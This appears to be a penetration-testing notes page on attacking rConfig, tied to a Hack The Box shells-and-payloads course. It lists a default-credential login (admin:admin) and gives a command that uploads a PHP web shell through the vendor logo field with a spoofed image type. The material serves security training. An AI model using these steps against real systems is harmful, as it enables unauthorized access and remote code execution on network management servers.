# rConfig

[![shells_and_payloads](../../../../cybersecurity/_badges/htb/shells_and_payloads.svg)](https://academy.hackthebox.com/course/preview/shells--payloads)

<div class="row row-cols-lg-2"><div>

[rConfig](https://www.rconfig.com/) is a network configuration management tool. At least from the [GitHub](https://github.com/rconfig/rconfig) <small>(0.1k ⭐)</small> repository, it doesn't seem very popular.

* Look for web interface on port 80
* Test default credentials `admin:admin`

Look for well-known CVEs, the version is at the bottom of the page.
</div><div>

If successfully logged, you may try to upload a shell. Navigate to `Devices > Vendors`, click on `Add Vendor` and try to exploit the image field. For reference, with [onectf](https://github.com/QuentinRa/onectf/blob/main/docs/uffuf.md):

```shell!
$ onectf uffuf -u 'https://IP/lib/crud/vendors.crud.php' -v -k --nr -H 'Cookie: PHPSESSID=XXX' -d 'vendorName=onectf&add=add&editid=' -p vendorLogo -F webshell.php -Fn imageFUZZ -Ft image/gif -W .php
[302 or 200] means OK
[301] means KO
```
</div></div>